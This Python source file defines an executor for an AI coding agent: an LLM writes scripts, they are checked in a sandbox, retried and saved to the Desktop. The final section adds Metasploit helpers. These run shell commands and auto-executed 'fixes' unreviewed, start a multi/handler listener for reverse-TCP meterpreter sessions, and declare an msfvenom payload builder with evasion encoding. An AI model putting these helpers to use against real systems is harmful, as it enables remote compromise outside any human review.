"""
Direct executor module for simple code generation and execution with sandbox verification.

Handles DIRECT mode requests: generate code, verify in sandbox, execute in isolation.
Integrates with SandboxRunManager for robust verification pipeline.
"""

import logging
import re
import subprocess
import sys
import tempfile
import time
import traceback
from datetime import datetime
from pathlib import Path
from typing import Callable, Generator, List, Optional

from spectral.gui_test_generator import GUITestGenerator
from spectral.intelligent_retry import IntelligentRetryManager
from spectral.llm_client import LLMClient
from spectral.memory_models import ExecutionMemory
from spectral.mistake_learner import MistakeLearner
from spectral.persistent_memory import MemoryModule
from spectral.retry_parsing import format_attempt_progress, parse_retry_limit
from spectral.sandbox_manager import SandboxResult, SandboxRunManager
from spectral.utils import (
    AUTONOMOUS_CODE_REQUIREMENT,
    SmartInputHandler,
    clean_code,
    detect_input_calls,
    generate_test_inputs,
    has_input_calls,
)

logger = logging.getLogger(__name__)


class DirectExecutor:
    """
    Executes simple code generation requests directly.

    Flow:
    1. Generate code from user request with learned patterns
    2. Write to file (auto-save to desktop if requested)
    3. Execute and stream output
    4. Learn from any failures
    """

    def __init__(
        self,
        llm_client: LLMClient,
        mistake_learner: Optional[MistakeLearner] = None,
        memory_module: Optional[MemoryModule] = None,
        gui_callback: Optional[Callable[[str, dict], None]] = None,
    ) -> None:
        """
        Initialize direct executor.

        Args:
            llm_client: LLM client for code generation
            mistake_learner: Mistake learner for storing and retrieving patterns
            memory_module: Optional memory module for tracking executions
            gui_callback: Optional callback for sandbox viewer updates
        """
        self.llm_client = llm_client
        self.mistake_learner = mistake_learner or MistakeLearner()
        self.memory_module = memory_module
        self.gui_callback = gui_callback
        self.gui_test_generator = GUITestGenerator(llm_client)
        self.sandbox_manager = SandboxRunManager()
        self._execution_history: list[ExecutionMemory] = []
        logger.info("DirectExecutor initialized with sandbox verification")

    def _emit_gui_event(self, event_type: str, data: dict) -> None:
        """
        Emit an event to the GUI callback (sandbox viewer).

        Args:
            event_type: Type of event
            data: Event data dictionary
        """
        if self.gui_callback:
            try:
                # Add timestamp to all events for better tracking
                from datetime import datetime

                if "timestamp" not in data:
                    data["timestamp"] = datetime.now().isoformat()

                self.gui_callback(event_type, data)
                logger.debug(f"GUI event emitted: {event_type} with data: {data}")
            except Exception as e:
                logger.debug(f"GUI callback error: {e}")

    def generate_code(
        self, user_request: str, language: str = "python", target_filename: Optional[str] = None
    ) -> str:
        """
        Generate code from user request with learned patterns.

        Args:
            user_request: User's natural language request
            language: Programming language (default: python)
            target_filename: Optional target filename for path construction

        Returns:
            Generated code as string
        """
        logger.info(f"Generating {language} code for: {user_request}")

        # Emit code generation started event
        self._emit_gui_event("code_generation_started", {})

        # Detect desktop save request
        save_to_desktop = self._detect_desktop_save_request(user_request)
        tags = ["general"]

        if save_to_desktop:
            tags.append("file_ops")
            tags.append("desktop")

        # Query learned patterns
        learned_patterns = self.mistake_learner.get_patterns_for_generation(tags=tags)

        # Build prompt with target filename context if available
        prompt = self._build_code_generation_prompt(user_request, language, learned_patterns)

        if target_filename:
            prompt += f"\n\nIMPORTANT: The user wants to save this as '{target_filename}'. "
            prompt += "Make sure to use this filename in any internal references or save logic."

        try:
            code = self.llm_client.generate(prompt)
            # Clean markdown formatting from generated code
            cleaned_code = clean_code(str(code))

            # Handle desktop save request
            if save_to_desktop:
                cleaned_code = self._modify_for_desktop_save(cleaned_code, user_request)

            logger.debug(f"Generated {len(cleaned_code)} characters of {language} code")

            # Emit code generated event to sandbox viewer
            self._emit_gui_event("code_generated", {"code": cleaned_code})
            self._emit_gui_event("code_generation_complete", {})

            return str(cleaned_code)
        except Exception as e:
            logger.error(f"Failed to generate code: {e}")
            self._emit_gui_event("error_occurred", {"error": str(e)})
            raise

    def write_execution_script(
        self,
        code: str,
        filename: Optional[str] = None,
        directory: Optional[Path] = None,
    ) -> Path:
        """
        Write generated code to a file.

        Args:
            code: Code content to write
            filename: Optional filename (auto-generated if not provided)
            directory: Optional directory (uses temp dir if not provided)

        Returns:
            Path to the written file
        """
        if directory is None:
            directory = Path(tempfile.gettempdir())

        if filename is None:
            # Auto-generate filename with timestamp
            timestamp = int(time.time())
            filename = f"spectral_script_{timestamp}.py"

        file_path = directory / filename
        file_path = file_path.resolve()

        logger.info(f"Writing script to: {file_path}")

        try:
            # Create directory if it doesn't exist
            directory.mkdir(parents=True, exist_ok=True)

            with open(file_path, "w", encoding="utf-8") as f:
                f.write(code)

            logger.info(f"Successfully wrote script to {file_path}")
            return file_path
        except Exception as e:
            logger.error(f"Failed to write script: {e}")
            raise

    def save_code_to_desktop(
        self,
        code: str,
        user_request: str,
        script_path: Optional[Path] = None,
        filename: Optional[str] = None,
    ) -> Path:
        """
        Save generated code to Desktop with timestamp.

        IMPORTANT: Saves the actual Python code, not execution output.

        Args:
            code: Code content to save (actual Python code)
            user_request: Original user request (for generating filename)
            script_path: Optional existing script path to copy from
            filename: Optional specific filename to use

        Returns:
            Path to the saved file on Desktop
        """
        # Generate filename from user request if not provided
        desktop = Path.home() / "Desktop"
        if not filename:
            filename = self._generate_safe_filename(user_request) + ".py"

        file_path = desktop / filename

        try:
            # If we have an existing script, copy it
            if script_path and script_path.exists():
                import shutil

                shutil.copy2(script_path, file_path)
                logger.info(f"Copied script to Desktop: {file_path}")
            else:
                # Write actual Python code directly (NOT code_with_prompts, NOT execution output)
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(code)
                logger.info(f"Saved Python code to Desktop: {file_path}")

            return file_path
        except Exception as e:
            logger.error(f"Failed to save code to Desktop: {e}")
            # Fallback to temp directory
            fallback_path = Path(tempfile.gettempdir()) / filename
            with open(fallback_path, "w", encoding="utf-8") as f:
                f.write(code)
            logger.info(f"Saved to temp instead: {fallback_path}")
            return fallback_path

    def _generate_safe_filename(self, user_request: str) -> str:
        """
        Generate a safe filename from user request.

        Args:
            user_request: Original user request

        Returns:
            Safe filename string
        """
        # Extract key words from request
        request_lower = user_request.lower()

        # Remove common phrases
        for phrase in [
            "write a program that",
            "create a program",
            "write me",
            "create",
            "generate",
            "python program",
            "python script",
            "script that",
            "program that",
        ]:
            request_lower = request_lower.replace(phrase, "")

        # Extract alphanumeric words
        words = re.findall(r"[a-z0-9]+", request_lower)

        # Take first 5 meaningful words
        meaningful_words = [w for w in words if len(w) > 2][:5]

        if not meaningful_words:
            return f"spectral_script_{int(time.time())}"

        return "spectral_" + "_".join(meaningful_words)

    def execute_with_input_support(
        self,
        script_path: Path,
        timeout: int = 30,
    ) -> Generator[str, None, None]:
        """
        Execute script with stdin support for interactive programs.

        Detects input() calls and generates test inputs automatically.

        Args:
            script_path: Path to the script to execute
            timeout: Execution timeout in seconds

        Yields:
            Output lines as they arrive
        """
        logger.info(f"Executing with input support: {script_path}")

        # Read code and detect input calls
        code = script_path.read_text()
        input_count, prompts = detect_input_calls(code)

        if input_count == 0:
            # No input calls, use regular execution
            yield from self.stream_execution(script_path, timeout)
            return

        logger.info(f"Detected {input_count} input() call(s), generating test inputs")

        # Generate test inputs
        test_inputs = generate_test_inputs(prompts)
        logger.info(f"Generated test inputs: {test_inputs}")

        try:
            # Windows-specific subprocess creation
            creation_flags = 0
            if sys.platform == "win32":
                creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

            # Use Popen for stdin support
            process = subprocess.Popen(
                [sys.executable, str(script_path)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                creationflags=creation_flags,
            )

            assert process.stdin is not None
            assert process.stdout is not None

            # Send all inputs joined with newlines
            input_data = "\n".join(test_inputs) + "\n"
            process.stdin.write(input_data)
            process.stdin.flush()

            # Read output in real-time
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break

                if line:
                    yield line
                    logger.debug(f"stdout: {line.rstrip()}")

            # Get exit code
            exit_code = process.wait(timeout=5)
            logger.info(f"Process exited with code {exit_code}")

            if exit_code != 0:
                yield f"\n❌ Script failed with exit code {exit_code}\n"

        except subprocess.TimeoutExpired:
            logger.warning(f"Script execution timeout after {timeout}s")
            yield f"\n❌ Error: Execution timed out after {timeout} seconds"
        except Exception as e:
            logger.error(f"Failed to execute script: {e}")
            error_msg = f"{type(e).__name__}: {str(e)}\n{traceback.format_exc()}"
            yield f"\n❌ Error: {error_msg}"

    def stream_execution(self, script_path: Path, timeout: int = 30) -> Generator[str, None, None]:
        """
        Execute script and stream output.

        Uses subprocess.run() for Windows compatibility, avoiding WinError 10038.

        Args:
            script_path: Path to the script to execute
            timeout: Execution timeout in seconds

        Yields:
            Output lines as they arrive (after completion)
        """
        logger.info(f"Streaming execution of {script_path}")

        try:
            # Windows-specific subprocess creation
            creation_flags = 0
            if sys.platform == "win32":
                creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

            # Use subprocess.run() instead of Popen for better Windows compatibility
            process = subprocess.run(
                [sys.executable, str(script_path)],
                capture_output=True,
                text=True,
                timeout=timeout,
                creationflags=creation_flags,
            )

            # Yield stdout line by line
            if process.stdout:
                for line in process.stdout.splitlines(keepends=True):
                    logger.debug(f"STDOUT: {line.rstrip()}")
                    yield line

            # Yield stderr line by line
            if process.stderr:
                for line in process.stderr.splitlines(keepends=True):
                    logger.debug(f"STDERR: {line.rstrip()}")
                    yield line

            # Check exit code
            exit_code = process.returncode
            logger.info(f"Process exited with code {exit_code}")

            if exit_code != 0:
                logger.warning(f"Script failed with exit code {exit_code}")

        except subprocess.TimeoutExpired:
            logger.warning(f"Script execution timeout after {timeout}s")
            yield f"\n❌ Error: Execution timed out after {timeout} seconds"
        except Exception as e:
            logger.error(f"Failed to stream execution: {e}")
            error_msg = f"{type(e).__name__}: {str(e)}\n{traceback.format_exc()}"
            yield f"\n❌ Error: {error_msg}"

    def execute_request(
        self,
        user_request: str,
        language: str = "python",
        timeout: int = 30,
        max_attempts: Optional[int] = None,
    ) -> Generator[str, None, None]:
        """Execute a user request end-to-end with sandbox verification.

        Retry behavior is bounded and loop-aware:
        - If the user doesn't specify a limit, attempts are capped at 15.
        - If the same error repeats several times, retries stop early to avoid loops.

        Uses SandboxRunManager for isolated verification before desktop export.
        """

        logger.info(f"Executing request: {user_request}")

        if max_attempts is None:
            parsed = parse_retry_limit(user_request)
            max_attempts = parsed if parsed is not None else 15

        retry_manager = IntelligentRetryManager(max_retries=max_attempts, error_repeat_threshold=3)

        code: Optional[str] = None
        last_error_output = ""
        desktop_path: Optional[Path] = None
        run_id: Optional[str] = None
        target_filename = self._generate_safe_filename(user_request) + ".py"

        while True:
            decision = retry_manager.should_retry()
            if not decision.should_retry:
                reason = decision.reason or "retry budget exhausted"
                yield f"\n❌ Stopping retries: {reason}\n"
                if last_error_output:
                    yield f"Last error:\n{last_error_output}\n"
                return

            attempt = retry_manager.next_attempt()
            progress = format_attempt_progress(attempt, max_attempts)

            try:
                if attempt == 1:
                    yield f"📝 Generating code... ({progress})\n"
                    code = self.generate_code(
                        user_request, language, target_filename=target_filename
                    )
                else:
                    yield f"📝 Fixing code... ({progress})\n"
                    code = self._generate_fix_code(
                        user_request=user_request,
                        previous_code=code or "",
                        error_output=last_error_output,
                        language=language,
                        attempt=attempt,
                    )

                yield "   ✓ Code generated\n\n"

                # Apply Smart Input Detection & Injection
                input_handler = SmartInputHandler()
                code, test_inputs = input_handler.detect_and_inject_inputs(code)
                if test_inputs:
                    yield f"🧠 Smart Input: Auto-injecting {len(test_inputs)} test values\n"
                    code = input_handler.inject_test_inputs(code, test_inputs)

                # Detect if code has input() calls (in case some were not handled by smart injector)
                has_interactive = has_input_calls(code)
                input_count, prompts = detect_input_calls(code)

                if has_interactive:
                    yield f"🔍 Detected {input_count} input() call(s)\n"

                # Create sandbox run for verification
                if run_id is None:
                    run_id = self.sandbox_manager.create_run()

                yield f"🔒 Creating isolated sandbox: {run_id}\n"

                # Prepare stdin data for interactive programs
                stdin_data = None
                if has_interactive:
                    test_inputs = generate_test_inputs(prompts)
                    stdin_data = "\n".join(test_inputs) + "\n"
                    yield f"   Generated test inputs: {test_inputs}\n"

                # Run verification pipeline
                yield "🔍 Running verification pipeline...\n"
                yield "   Gate 1: Syntax check\n"
                yield "   Gate 2: Test execution\n"
                yield "   Gate 3: Smoke test\n\n"

                # Detect GUI program
                is_gui, framework = self.gui_test_generator.detect_gui_program(code)

                # For GUI programs, we may need to regenerate with test_mode contract
                if is_gui and framework:
                    yield f"🎨 Detected GUI program ({framework})\n"
                    yield "   Enforcing test_mode contract for verification\n"

                # Execute sandbox verification
                result = self.sandbox_manager.execute_verification_pipeline(
                    run_id=run_id,
                    code=code,
                    filename=target_filename,
                    is_gui=is_gui,
                    stdin_data=stdin_data,
                )

                # Check verification results
                yield "📊 Verification Results:\n"
                for gate, passed in result.gates_passed.items():
                    status = "✅ PASS" if passed else "❌ FAIL"
                    yield f"   {gate.title()}: {status}\n"
                yield "\n"

                if result.status == "success":
                    yield "✅ All verification gates passed!\n\n"

                    # Export to desktop
                    yield "💾 Exporting verified code to Desktop...\n"
                    desktop_path = None
                    try:
                        desktop_path = self.save_code_to_desktop(
                            code, user_request, result.code_path, filename=target_filename
                        )
                        yield f"   ✓ Saved to: {desktop_path}\n"
                    except Exception as e:
                        yield f"   ⚠️  Could not save to Desktop: {e}\n"

                    # Extract actual file locations (Desktop paths)
                    file_locations = self._extract_file_locations(
                        user_request, desktop_path, target_filename
                    )

                    # Save run metadata
                    self.sandbox_manager.save_run_metadata(run_id, result)

                    # Save comprehensive execution metadata with file_locations
                    execution_metadata = {
                        "run_id": run_id,
                        "timestamp": datetime.now().isoformat(),
                        "prompt": user_request,
                        "filename": target_filename,
                        "desktop_path": str(desktop_path) if desktop_path else None,
                        "sandbox_path": str(result.code_path),
                        "code": code,
                        "execution_status": "success",
                        "execution_output": result.log_stdout,
                        "execution_error": result.log_stderr,
                        "attempts": attempt,
                        "last_error": None,
                        "file_locations": file_locations,  # Include actual file paths
                    }
                    self.sandbox_manager.save_execution_metadata(execution_metadata)

                    # Save to memory
                    if self.memory_module:
                        self._save_execution_to_memory(
                            user_request, code, desktop_path, result, is_gui
                        )

                    # Clean up sandbox
                    self.sandbox_manager.cleanup_run(run_id)

                    yield "\n🎉 Code successfully verified and exported!\n"
                    return

                # Verification failed, handle different failure types
                yield f"❌ Verification failed: {result.status}\n"

                if result.error_message:
                    yield f"Error: {result.error_message}\n\n"

                if result.status == "syntax_error":
                    yield "🔧 Fixing syntax error and retrying...\n"
                    last_error_output = result.error_message or ""
                elif result.status == "test_failure":
                    yield "🔧 Tests failed, regenerating with fixes...\n"
                    last_error_output = result.pytest_summary or result.error_message or ""
                elif result.status == "timeout":
                    yield "🔧 Execution timeout, optimizing code...\n"
                    last_error_output = (
                        "Execution timeout - code may have infinite loops or blocking calls"
                    )
                else:
                    yield "🔧 Code verification failed, regenerating...\n"
                    last_error_output = result.error_message or ""

                # Save metadata for failed execution
                execution_metadata = {
                    "run_id": run_id,
                    "timestamp": datetime.now().isoformat(),
                    "prompt": user_request,
                    "filename": target_filename,
                    "desktop_path": None,
                    "sandbox_path": str(result.code_path),
                    "code": code,
                    "execution_status": "failed",
                    "execution_output": result.log_stdout,
                    "execution_error": result.log_stderr,
                    "attempts": attempt,
                    "last_error": last_error_output or result.status,
                }
                self.sandbox_manager.save_execution_metadata(execution_metadata)

                retry_manager.record_error(last_error_output or result.status)

                # Clean up failed run
                self.sandbox_manager.cleanup_run(run_id)
                run_id = None  # Create new run for retry

                # If the repeated error detector thinks we're stuck, stop now.
                post_fail_decision = retry_manager.should_retry()
                if not post_fail_decision.should_retry:
                    reason = post_fail_decision.reason or "retry budget exhausted"
                    yield f"\n❌ Stopping retries: {reason}\n"
                    if last_error_output:
                        yield f"Last error:\n{last_error_output}\n"
                    return

                yield "🔄 Retrying...\n\n"
                continue

            except Exception as e:
                logger.error(f"Execution failed: {e}")
                yield f"\n❌ Execution error: {str(e)}\n"

                # Clean up on error
                if run_id:
                    self.sandbox_manager.cleanup_run(run_id)

                return

    def _save_execution_to_memory(
        self,
        user_request: str,
        code: str,
        desktop_path: Optional[Path],
        result: SandboxResult,
        is_gui: bool,
    ) -> None:
        """
        Save execution details to persistent memory.

        Args:
            user_request: Original user request
            code: Generated code
            desktop_path: Path where code was saved
            result: Sandbox verification result
            is_gui: Whether this was a GUI program
        """
        if not self.memory_module:
            return

        try:
            file_locations = [str(result.code_path)]
            if desktop_path:
                file_locations.append(str(desktop_path))

            # Add test files if they exist
            for test_path in result.test_paths:
                file_locations.append(str(test_path))

            description = self._generate_description(user_request, code)
            tags = ["python", "sandbox_verification"]
            if is_gui:
                tags.append("gui")
            else:
                tags.append("cli")

            execution_id = self.memory_module.save_execution(
                user_request=user_request,
                description=description,
                code_generated=code,
                file_locations=file_locations,
                output=f"Sandbox verification passed in {result.duration_seconds:.2f}s",
                success=True,
                tags=tags,
            )

            logger.info(f"Saved sandbox execution to memory: {execution_id}")

        except Exception as e:
            logger.error(f"Failed to save execution to memory: {e}")

    def _run_script_with_input_support(self, script_path: Path, timeout: int) -> tuple[int, str]:
        """
        Run a script with stdin support for interactive programs.

        Args:
            script_path: Path to the script
            timeout: Execution timeout

        Returns:
            Tuple of (exit_code, combined_output)
        """
        code = script_path.read_text()
        input_count, prompts = detect_input_calls(code)

        if input_count == 0:
            # No input calls, use regular execution
            return self._run_script_capture(script_path, timeout)

        # Generate test inputs
        test_inputs = generate_test_inputs(prompts)

        creation_flags = 0
        if sys.platform == "win32":
            creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

        try:
            process = subprocess.Popen(
                [sys.executable, str(script_path)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                creationflags=creation_flags,
            )

            # Send all inputs
            input_data = "\n".join(test_inputs) + "\n"
            stdout, _ = process.communicate(input=input_data, timeout=timeout)

            return process.returncode, stdout
        except subprocess.TimeoutExpired:
            return 124, f"Execution timed out after {timeout} seconds"
        except Exception as e:
            return 1, str(e)

    def _run_script_capture(self, script_path: Path, timeout: int) -> tuple[int, str]:
        """Run a script and capture its combined output."""

        creation_flags = 0
        if sys.platform == "win32":
            creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

        result = subprocess.run(
            [sys.executable, str(script_path)],
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
            creationflags=creation_flags,
        )

        combined_output = (result.stdout or "") + (result.stderr or "")
        return result.returncode, combined_output

    def _detect_desktop_save_request(self, user_request: str) -> bool:
        """Detect if user wants to save to desktop."""
        patterns = [
            r"save\s+(?:it|them|the\s+file|to\s+desktop)",
            r"(?:on|to)\s+desktop",
            r"desktop\s+(?:folder|directory)",
        ]
        return any(re.search(pattern, user_request.lower()) for pattern in patterns)

    def _modify_for_desktop_save(self, code: str, user_request: str) -> str:
        """Modify code to save to desktop if requested."""
        import re

        desktop_pattern = re.compile(r"['\"]\s*\.\s*['\"]|['\"][^'\"]*['\"]")

        # Check if there's a file open/write operation
        if desktop_pattern.search(code):
            # Replace with desktop path
            desktop_path = str(Path.home() / "Desktop")
            code = re.sub(
                r"(['\"])(\.\s*|desktop)(['\"])",
                rf"\1{desktop_path}\3",
                code,
                flags=re.IGNORECASE,
            )
        return code

    def _extract_file_locations(
        self,
        user_request: str,
        desktop_path: Optional[Path],
        filename: str,
    ) -> List[str]:
        """
        Extract actual file locations from Desktop and other locations.

        Args:
            user_request: Original user request for filename extraction
            desktop_path: Path to file on Desktop if saved
            filename: Target filename

        Returns:
            List of file paths where files were created
        """
        file_locations: List[str] = []

        # Add Desktop path if it exists
        if desktop_path and Path(desktop_path).exists():
            file_locations.append(str(desktop_path))

        # Also check Desktop for files matching the prompt pattern
        desktop = Path.home() / "Desktop"

        # Generate expected filename from user request
        expected_base = self._generate_safe_filename(user_request)

        if desktop.exists():
            # Look for matching files on Desktop
            for file_path in desktop.iterdir():
                if file_path.is_file():
                    # Check if it matches the expected pattern
                    file_name_lower = file_path.name.lower()
                    expected_lower = expected_base.lower()

                    # Check for spectral_* pattern or exact match
                    if (
                        file_name_lower.startswith("spectral_")
                        or file_name_lower.startswith(expected_lower)
                        or file_name_lower.replace("_", "").startswith(
                            expected_lower.replace("_", "")
                        )
                    ):
                        # Verify it's a Python file or matches the target filename
                        if file_path.suffix == ".py" or filename in file_path.name:
                            if str(file_path) not in file_locations:
                                file_locations.append(str(file_path))

        return file_locations

    def _generate_fix_code(
        self,
        user_request: str,
        previous_code: str,
        error_output: str,
        language: str,
        attempt: int,
    ) -> str:
        """
        Generate fixed code based on error output.

        Args:
            user_request: Original user request
            previous_code: Code that failed
            error_output: Error message/output
            language: Programming language
            attempt: Current attempt number

        Returns:
            Fixed code
        """
        # Check if error is from test failures
        is_test_failure = "GUI Tests Failed" in error_output or "FAILED" in error_output

        if is_test_failure:
            prompt = f"""{AUTONOMOUS_CODE_REQUIREMENT}

The following {language} GUI code failed automated tests:

Request: {user_request}
Attempt: {attempt}

Test Results:
{error_output[:1500]}

Previous Code:
{previous_code[:1500]}

The automated tests verify:
- Program initialization
- UI element creation
- Event handlers work correctly
- State changes happen as expected
- Randomization/variety in behavior

Analyze the test failures and provide a FIXED version that:
1. Addresses the specific test failures
2. Ensures all UI elements are properly created and accessible
3. Makes sure event handlers are connected and functional
4. Implements proper state management
5. Includes variety/randomization where needed
6. Can be tested programmatically (mock mainloop, testable methods)
7. Uses hard-coded inputs instead of input()

Return ONLY the complete fixed code, no markdown formatting."""
        else:
            prompt = f"""{AUTONOMOUS_CODE_REQUIREMENT}

The following {language} code failed:

Request: {user_request}
Attempt: {attempt}
Error: {error_output}

Previous Code:
{previous_code[:1000]}

Analyze the error and provide a FIXED version that:
1. Addresses the specific error
2. Maintains the original intent
3. Uses proper error handling
4. Includes comments explaining the fix
5. Uses hard-coded inputs instead of input()

Return ONLY the complete fixed code, no markdown formatting."""

        try:
            code = self.llm_client.generate(prompt)
            cleaned_code = clean_code(str(code))
            logger.debug(f"Generated fix for attempt {attempt}")
            return str(cleaned_code)
        except Exception as e:
            logger.error(f"Failed to generate fix code: {e}")
            raise

    def _generate_filename(self, filename_base: str) -> str:
        """Generate a filename with timestamp."""
        import time

        # Add timestamp
        timestamp = int(time.time())
        return f"{filename_base}_{timestamp}.py"

    def _build_code_generation_prompt(
        self, user_request: str, language: str, learned_patterns: Optional[list] = None
    ) -> str:
        """
        Build prompt for code generation with learned patterns.

        Args:
            user_request: User's natural language request
            language: Programming language
            learned_patterns: List of learned patterns to apply

        Returns:
            Formatted prompt string
        """
        import getpass

        username = getpass.getuser()

        prompt = f"""{AUTONOMOUS_CODE_REQUIREMENT}

Task: Write a {language} script that does the following:
{user_request}

Remember:
- Hard-code all input values
- No input() calls
- Code must run autonomously
- Produce output immediately

IMPORTANT: You are running on Windows. Always use Windows paths:
- Home directory: C:\\Users\\{username}
- Desktop: C:\\Users\\{username}\\Desktop
- Temp: C:\\Users\\{username}\\AppData\\Local\\Temp

NEVER use:
- /path/to/... (Unix paths)
- /usr/bin, /home, /var (Unix directories)
- Relative paths like './data' (use full Windows paths)

For file operations, use:
- os.path.expanduser('~') for home directory
- os.path.join() for path construction
- Always use backslashes or raw strings: r'C:\\path\\to\\file'

General Requirements:
- Write complete, executable code
- Include proper error handling
- Add comments explaining the code
- Make it production-ready
- No extra text or explanations, just code
- IMPORTANT: For interactive programs, use hard-coded values NOT input()
- IMPORTANT (GUI programs): if you use tkinter/pygame/PyQt/kivy, structure:
  - Do NOT create or show any GUI windows at import time
  - Put main loop / window launch code under if __name__ == "__main__":
  - Encapsulate state + event handlers in a class
  - Keep UI separate from core logic so tests can verify state changes
- No markdown formatting, no explanations."""

        # Inject learned patterns
        if learned_patterns:
            prompt += "\n\nBased on previous mistakes, also include:\n"
            for i, pattern in enumerate(learned_patterns[:5], 1):
                prompt += f"{i}. For {pattern.get('error_type')}: {pattern.get('fix_applied')}\n"
            prompt += "\nApply these patterns to avoid of same errors.\n"

        prompt += """
        Return only code, no markdown formatting, no explanations."""
        return prompt

    def _generate_description(self, user_request: str, code: str) -> str:
        """
        Generate a semantic description for an execution.

        Args:
            user_request: Original user request
            code: Generated code

        Returns:
            Semantic description
        """
        # Extract key concepts from user request
        request_lower = user_request.lower()

        if "file" in request_lower or "count" in request_lower:
            return f"File {user_request}"

        if "web" in request_lower or "scrape" in request_lower or "download" in request_lower:
            return "Web scraper"

        if "api" in request_lower:
            return "API client"

        if "data" in request_lower or "process" in request_lower:
            return "Data processing script"

        if "gui" in request_lower or "window" in request_lower or "interface" in request_lower:
            return "GUI application"

        if "sort" in request_lower or "filter" in request_lower:
            return "Data manipulation script"

        if "convert" in request_lower or "transform" in request_lower:
            return "Data conversion script"

        if "backup" in request_lower or "copy" in request_lower:
            return "File backup script"

        # Default description
        return f"Python script: {user_request[:50]}"

    def execute_metasploit_command(
        self,
        command: str,
        show_terminal: bool = True,
        timeout: int = 60,
        auto_fix: bool = True,
    ) -> tuple[int, str]:
        """
        Execute a Metasploit command and capture output.

        Args:
            command: Metasploit command to execute
            show_terminal: Whether to show terminal window
            timeout: Command timeout in seconds
            auto_fix: Whether to attempt autonomous fixes for common errors

        Returns:
            Tuple of (exit_code, output)
        """
        from spectral.knowledge import diagnose_error, get_auto_fix_command

        logger.info(f"Executing Metasploit command: {command[:100]}")

        # Emit GUI event for command start
        self._emit_gui_event(
            "command_start",
            {"command": command, "show_terminal": show_terminal, "type": "metasploit"},
        )

        try:
            # Execute the command
            if show_terminal:
                # Run with visible terminal (platform-specific)
                if sys.platform == "win32":
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=timeout,
                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                    )
                else:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=timeout,
                    )
            else:
                # Run without visible terminal
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                )

            output = (result.stdout or "") + (result.stderr or "")

            # Check for errors and attempt autonomous fixes
            if auto_fix and result.returncode != 0:
                # Emit GUI event for error
                self._emit_gui_event(
                    "command_error",
                    {"command": command, "error": output, "exit_code": result.returncode},
                )

                # Diagnose the error
                diagnosis, fixes = diagnose_error(output)

                logger.info(f"Metasploit error diagnosed: {diagnosis}")
                logger.info(f"Suggested fixes: {fixes}")

                # Try autonomous fixes
                for fix in fixes:
                    logger.info(f"Attempting autonomous fix: {fix}")

                    # Execute the fix command
                    fix_result = subprocess.run(
                        fix,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30,
                    )

                    if fix_result.returncode == 0:
                        logger.info(f"Autonomous fix succeeded: {fix}")
                        # Retry original command
                        result = subprocess.run(
                            command,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=timeout,
                        )
                        output = (result.stdout or "") + (result.stderr or "")

                        if result.returncode == 0:
                            break
                    else:
                        logger.warning(f"Autonomous fix failed: {fix}")

            # Emit GUI event for command completion
            self._emit_gui_event(
                "command_complete",
                {
                    "command": command,
                    "exit_code": result.returncode,
                    "output": output,
                },
            )

            return result.returncode, output

        except subprocess.TimeoutExpired:
            error_msg = f"Metasploit command timed out after {timeout} seconds"
            logger.error(error_msg)
            self._emit_gui_event("command_timeout", {"command": command, "timeout": timeout})
            return 124, error_msg
        except Exception as e:
            error_msg = f"Error executing Metasploit command: {str(e)}"
            logger.exception(error_msg)
            self._emit_gui_event("command_error", {"command": command, "error": error_msg})
            return 1, error_msg

    def execute_metasploit_interactive(
        self,
        commands: List[str],
        show_terminal: bool = True,
        timeout_per_command: int = 30,
    ) -> List[tuple[int, str]]:
        """
        Execute multiple Metasploit commands interactively.

        Args:
            commands: List of Metasploit commands to execute in sequence
            show_terminal: Whether to show terminal window
            timeout_per_command: Timeout for each command

        Returns:
            List of (exit_code, output) tuples for each command
        """
        results = []

        for cmd in commands:
            exit_code, output = self.execute_metasploit_command(
                command=cmd,
                show_terminal=show_terminal,
                timeout=timeout_per_command,
                auto_fix=True,
            )
            results.append((exit_code, output))

            # Check if command failed critically
            if exit_code != 0 and "[-]" in output:
                # Critical error, stop execution
                logger.warning(f"Critical error in command: {cmd[:50]}")
                break

        return results

    def start_metasploit_listener(
        self,
        payload: str,
        lhost: str,
        lport: int,
        show_terminal: bool = True,
    ) -> tuple[int, str]:
        """
        Start a Metasploit listener for a reverse TCP payload.

        Args:
            payload: Payload module (e.g., windows/meterpreter/reverse_tcp)
            lhost: Local host IP (attacker IP)
            lport: Local port for listener
            show_terminal: Whether to show terminal window

        Returns:
            Tuple of (exit_code, output)
        """
        logger.info(f"Starting Metasploit listener for {payload} on {lhost}:{lport}")

        # Generate commands to start listener
        commands = [
            "use exploit/multi/handler",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            "set ExitOnSession false",
            "run",
        ]

        # Execute commands
        results = self.execute_metasploit_interactive(
            commands=commands,
            show_terminal=show_terminal,
            timeout_per_command=10,
        )

        # Return result of the final 'run' command
        return results[-1] if results else (1, "No commands executed")

    def generate_metasploit_payload(
        self,
        payload: str,
        lhost: str,
        lport: int,
        output_format: str = "exe",
        output_path: Optional[Path] = None,
        encoding: Optional[str] = None,
        iterations: int = 1,
    ) -> tuple[int, str, Optional[Path]]:
        """
        Generate a Metasploit payload using msfvenom.

        Args:
            payload: Payload module (e.g., windows/meterpreter/reverse_tcp)
            lhost: Local host IP (attacker IP)
            lport: Local port for connection
            output_format: Output format (exe, dll, ps1, elf, etc.)
            output_path: Path to save payload (defaults to Desktop)
            encoding: Encoding method (e.g., shikata_ga_nai)
            iterations: Number of encoding iterations

        Returns:
            Tuple of (exit_code, output, payload_path)
        """
